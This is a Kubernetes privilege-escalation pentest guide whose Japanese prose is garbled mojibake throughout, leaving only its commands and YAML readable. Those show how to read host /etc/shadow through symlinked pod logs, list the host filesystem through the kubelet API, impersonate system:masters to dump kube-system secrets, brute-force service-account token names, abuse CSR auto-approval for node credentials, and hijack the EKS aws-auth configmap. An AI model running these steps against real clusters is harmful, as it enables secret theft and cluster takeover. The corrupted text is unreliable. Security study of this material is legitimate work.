æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ä»»æ„ã®ãƒãƒƒãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãŸã‚ã€**ãƒãƒƒãƒ‰ä½œæˆã®æ‚ªç”¨**ã¨åŒæ§˜ã«ã€ä»–ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ¯ãƒ¼ãƒ‰

ã“ã®æ¨©é™ã¯ã€**æŒ‡å®šã•ã‚ŒãŸãƒãƒƒãƒ‰ã®1ã¤ã®ãƒãƒ¼ãƒˆã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã®1ã¤ã®ãƒãƒ¼ãƒˆã«è»¢é€ã™ã‚‹**ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒãƒƒãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒãƒƒã‚°ã‚’å®¹æ˜“ã«ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ãŒã€æ”»æ’ƒè€…ã¯ãã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ãƒãƒƒãƒ‰å†…ã®èˆˆå‘³æ·±ã„ï¼ˆä¾‹ï¼šDBï¼‰ã¾ãŸã¯è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆã‚¦ã‚§ãƒ–ï¼Ÿï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
kubectl port-forward pod/mypod 5000:5000
```
### **ãƒ›ã‚¹ãƒˆã®æ›¸ãè¾¼ã¿å¯èƒ½ãª/var/log/ã®è„±å‡º**

[**ã“ã®ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ãƒ›ã‚¹ãƒˆã®`/var/log/`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸãƒãƒƒãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã¾ãŸã¯ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€**Kube-APIãŒã‚³ãƒ³ãƒ†ãƒŠã®ãƒ­ã‚°ã‚’å–å¾—**ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ãï¼ˆ`kubectl logs <pod>`ã‚’ä½¿ç”¨ï¼‰ã€**Kubelet**ã‚µãƒ¼ãƒ“ã‚¹ã®`/logs/`ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã®`0.log`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ãŸã‚ã§ã™ã€‚\
Kubeletã‚µãƒ¼ãƒ“ã‚¹ã¯ã€åŸºæœ¬çš„ã«ã‚³ãƒ³ãƒ†ãƒŠã®`/var/log`ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’å…¬é–‹ã—ã¦ã„ã‚‹`/logs/`ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ã„ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠã®`/var/log/`ãƒ•ã‚©ãƒ«ãƒ€ã«**æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…**ã¯ã€æ¬¡ã®2ã¤ã®æ–¹æ³•ã§ã“ã®å‹•ä½œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* ä¾‹ãˆã°ã€`0.log`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’`/etc/shadow`ã‚’æŒ‡ã™**ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯**ã«å¤‰æ›´ã—ã¾ã™ã€‚ãã®å¾Œã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ›ã‚¹ãƒˆã®shadowãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* æ”»æ’ƒè€…ãŒ**`nodes/log`ã‚’èª­ã‚€æ¨©é™ã‚’æŒã¤**ä»»æ„ã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹å ´åˆã€å½¼ã¯å˜ã«`/host-mounted/var/log/sym`ã«`symlink`ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€`https://<gateway>:10250/logs/sym/`ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒ›ã‚¹ãƒˆã®ãƒ«ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãŒãƒªã‚¹ãƒˆã•ã‚Œã¾ã™ï¼ˆã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼‰ã€‚
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**å®Ÿé¨“å®¤ã¨è‡ªå‹•åŒ–ã•ã‚ŒãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **ã«ã‚ã‚Šã¾ã™**

#### readOnlyä¿è­·ã®ãƒã‚¤ãƒ‘ã‚¹ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

ã‚‚ã—é‹ãŒè‰¯ãã€é«˜ç‰¹æ¨©ã® `CAP_SYS_ADMIN` æ©Ÿèƒ½ãŒåˆ©ç”¨å¯èƒ½ãªå ´åˆã€ãƒ•ã‚©ãƒ«ãƒ€ã‚’èª­ã¿æ›¸ãå¯èƒ½ã«å†ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
mount -o rw,remount /hostlogs/
```
#### hostPathã®readOnlyä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**ã“ã®ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
æ¬¡ã«ã€ä»¥å‰ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã¨åŒæ§˜ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã‚’é˜²ããŸã‚ã«ã€hostPathãƒã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã›ãšã«ã€PersistentVolumeã¨PersistentVolumeClaimã‚’ä½¿ç”¨ã—ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒ›ã‚¹ãƒˆã®ãƒ•ã‚©ãƒ«ãƒ€ã‚’æ›¸ãè¾¼ã¿å¯èƒ½ãªã‚¢ã‚¯ã‚»ã‚¹ã§ãƒã‚¦ãƒ³ãƒˆã™ã‚‹æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãªã‚Šã™ã¾ã—**

[**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãªã‚Šã™ã¾ã—**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)ã®ç‰¹æ¨©ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®ä¾‹ã§ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ _**sa-imper**_ ãŒã€ã‚°ãƒ«ãƒ¼ãƒ—ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãªã‚Šã™ã¾ã—ã‚’è¨±å¯ã™ã‚‹ãƒ«ãƒ¼ãƒ«ã‚’æŒã¤ ClusterRole ã«ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã•ã‚Œã¦ã„ã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

`--as=null --as-group=system:master` å±æ€§ã‚’ä½¿ç”¨ã—ã¦ã€**ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ï¼š

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**åŒã˜æ“ä½œã‚’API RESTã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä»‹ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ä¸€è¦§è¡¨ç¤º**

**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ä¸€è¦§è¡¨ç¤ºæ¨©é™**ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§æŒã¤ã¨éå¸¸ã«å¼·åŠ›ãªæ©Ÿèƒ½ã§ã™ã€‚ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ä¸€è¦§è¡¨ç¤ºæ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€**ç®¡ç†è€…ã‚­ãƒ¼ã‚’å«ã‚€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’è¡¨ç¤ºã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚­ãƒ¼ã¯ã€ãƒ™ãƒ¼ã‚¹64ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸJWTãƒˆãƒ¼ã‚¯ãƒ³ã§ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§\_list secrets\_ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹æ”»æ’ƒè€…ã¯ã€ä»¥ä¸‹ã®_curl_ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€Œkube-systemã€åå‰ç©ºé–“ã®ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®èª­ã¿å–ã‚Š - ãƒˆãƒ¼ã‚¯ãƒ³IDã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒ**

ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹æ¨©é™ã‚’æŒã¤ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦‹ã¤ã‘ãŸæ”»æ’ƒè€…ã¯ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®å®Œå…¨ãªåå‰ã‚’çŸ¥ã‚‰ãªã„é™ã‚Šã€ã“ã®æ¨©é™ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã“ã®æ¨©é™ã¯ã€ä¸Šè¨˜ã§èª¬æ˜ã—ãŸ_**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ä¸€è¦§è¡¨ç¤º**_æ¨©é™ã¨ã¯ç•°ãªã‚Šã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

æ”»æ’ƒè€…ã¯ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®åå‰ã‚’çŸ¥ã‚Šã¾ã›ã‚“ãŒã€ç™»éŒ²ã§ãã‚‹ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã‚ã‚Šã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

å„ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯ã€é™çš„ï¼ˆå¤‰æ›´ã•ã‚Œãªã„ï¼‰ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã¨æœ«å°¾ã«ãƒ©ãƒ³ãƒ€ãƒ ãª5æ–‡å­—ã®æ–‡å­—åˆ—ãƒˆãƒ¼ã‚¯ãƒ³ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãŒã‚ã‚Šã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

ãƒ©ãƒ³ãƒ€ãƒ ãªãƒˆãƒ¼ã‚¯ãƒ³ã®æ§‹é€ ã¯ã€è‹±æ•°å­—ï¼ˆå°æ–‡å­—ã¨æ•°å­—ï¼‰ã®æ–‡å­—ã‹ã‚‰æ§‹æˆã•ã‚Œã‚‹5æ–‡å­—ã®æ–‡å­—åˆ—ã§ã™ã€‚**ãŸã ã—ã€ã™ã¹ã¦ã®æ–‡å­—ã¨æ•°å­—ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚**

[ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ã‚’è¦‹ã‚‹ã¨ã€ãƒˆãƒ¼ã‚¯ãƒ³ã¯27æ–‡å­—ã®æ–‡å­—ã€Œbcdfghjklmnpqrstvwxz2456789ã€ã®ã¿ã‹ã‚‰ç”Ÿæˆã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

ã“ã‚Œã«ã‚ˆã‚Šã€ãƒˆãƒ¼ã‚¯ãƒ³ã®å¯èƒ½æ€§ã¯275 = 14,348,907é€šã‚Šã‚ã‚Šã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€æ•°æ™‚é–“ã§ãƒˆãƒ¼ã‚¯ãƒ³IDã‚’æ¨æ¸¬ã™ã‚‹ãŸã‚ã«ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®æ©Ÿå¯†ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ã«æˆåŠŸã™ã‚Œã°ã€ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### è¨¼æ˜æ›¸ç½²åãƒªã‚¯ã‚¨ã‚¹ãƒˆ

ãƒªã‚½ãƒ¼ã‚¹`certificatesigningrequests`ï¼ˆã¾ãŸã¯å°‘ãªãã¨ã‚‚`certificatesigningrequests/nodeClient`ï¼‰ã«**`create`**ã®å‹•è©ãŒã‚ã‚‹å ´åˆã€**æ–°ã—ã„ãƒãƒ¼ãƒ‰ã®**æ–°ã—ã„CeSRã‚’**ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è‡ªå‹•æ‰¿èªã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ã®ã§ã€ãã®å ´åˆã¯**è¿½åŠ ã®æ¨©é™ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“**ã€‚ãã†ã§ãªã„å ´åˆã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‰¿èªã™ã‚‹ã“ã¨ãŒã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€`certificatesigningrequests/approval`ã®æ›´æ–°ã¨`signers`ã®`approve`ã«ãƒªã‚½ãƒ¼ã‚¹å`<signerNameDomain>/<signerNamePath>`ã¾ãŸã¯`<signerNameDomain>/*`ã‚’æŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

å¿…è¦ãªã™ã¹ã¦ã®æ¨©é™ã‚’æŒã¤**ãƒ­ãƒ¼ãƒ«ã®ä¾‹**ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
So, with the new node CSR approved, you can **abuse** the special permissions of nodes to **steal secrets** and **escalate privileges**.

In [**this post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) and [**this one**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), the GKE K8s TLS Bootstrap configuration is configured with **automatic signing** and it's abused to generate credentials of a new K8s Node and then abuse those to escalate privileges by stealing secrets.\
If you **have the mentioned privileges, you could do the same thing**. Note that the first example bypasses the error preventing a new node from accessing secrets inside containers because a **node can only access the secrets of containers mounted on it**.

The way to bypass this is just to **create node credentials for the node name where the container with the interesting secrets is mounted** (but just check how to do it in the first post):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKSï¼ˆAWSå†…ï¼‰ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®kube-systemåå‰ç©ºé–“ã§**`configmaps`**ã‚’å¤‰æ›´ã§ãã‚‹ä¸»ä½“ã¯ã€**aws-auth** configmapã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ç®¡ç†è€…æ¨©é™ã‚’å–å¾—ã§ãã¾ã™ã€‚
å¿…è¦ãªå‹•è©ã¯**`update`**ã¨**`patch`**ã§ã™ã€‚configmapãŒä½œæˆã•ã‚Œã¦ã„ãªã„å ´åˆã¯**`create`**ãŒå¿…è¦ã§ã™ã€‚

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**`aws-auth`**ã‚’ä½¿ç”¨ã—ã¦ã€**ä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’ä¸ãˆã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

ãŸã ã—ã€`aws --profile other_account eks update-kubeconfig --name <cluster-name>`ã¯**ç•°ãªã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€å®Ÿéš›ã«ã¯ã€`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`ã¯ã€åå‰ã ã‘ã§ãªãã‚¯ãƒ©ã‚¹ã‚¿ã®ARNã‚’ä½¿ç”¨ã™ã‚‹ã¨æ©Ÿèƒ½ã—ã¾ã™ã€‚\
`kubectl`ã‚’å‹•ä½œã•ã›ã‚‹ãŸã‚ã«ã¯ã€**è¢«å®³è€…ã®kubeconfigã‚’è¨­å®š**ã—ã€aws exec argsã«`--profile other_account_role`ã‚’è¿½åŠ ã™ã‚‹ã ã‘ã§ã€kubectlã¯ä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€AWSã«æ¥ç¶šã—ã¾ã™ã€‚
{% endhint %}

### GKEã§ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

GCPã®ä¸»ä½“ã«K8sã®æ¨©é™ã‚’å‰²ã‚Šå½“ã¦ã‚‹æ–¹æ³•ã¯**2ã¤**ã‚ã‚Šã¾ã™ã€‚ã„ãšã‚Œã®å ´åˆã§ã‚‚ã€ä¸»ä½“ã¯ã‚¯ãƒ©ã‚¹ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®è³‡æ ¼æƒ…å ±ã‚’åé›†ã™ã‚‹ãŸã‚ã«**`container.clusters.get`**ã®æ¨©é™ã‚‚å¿…è¦ã§ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€ç‹¬è‡ªã®kubectlæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆæ¬¡ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼‰ã€‚

{% hint style="warning" %}
K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«æ¥ç¶šã™ã‚‹éš›ã«ã¯ã€GCPã®èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚ãã®å¾Œã€GCPã¯K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä»‹ã—ã¦ã€ä¸»ä½“ï¼ˆãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ˆã‚‹ï¼‰ãŒã‚¯ãƒ©ã‚¹ã‚¿å†…ã§ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’æœ€åˆã«ãƒã‚§ãƒƒã‚¯ã—ã€æ¬¡ã«GCP IAMçµŒç”±ã§ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ãŒ**true**ã§ã‚ã‚Œã°ã€å¿œç­”ãŒè¿”ã•ã‚Œã¾ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€GCP IAMçµŒç”±ã§æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã‚ˆã†ã«ã¨ã„ã†ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
{% endhint %}

æœ€åˆã®æ–¹æ³•ã¯**GCP IAM**ã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã§ã€K8sã®æ¨©é™ã«ã¯**å¯¾å¿œã™ã‚‹GCP IAMã®æ¨©é™**ãŒã‚ã‚Šã€ä¸»ä½“ãŒãã‚Œã‚’æŒã£ã¦ã„ã‚Œã°ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

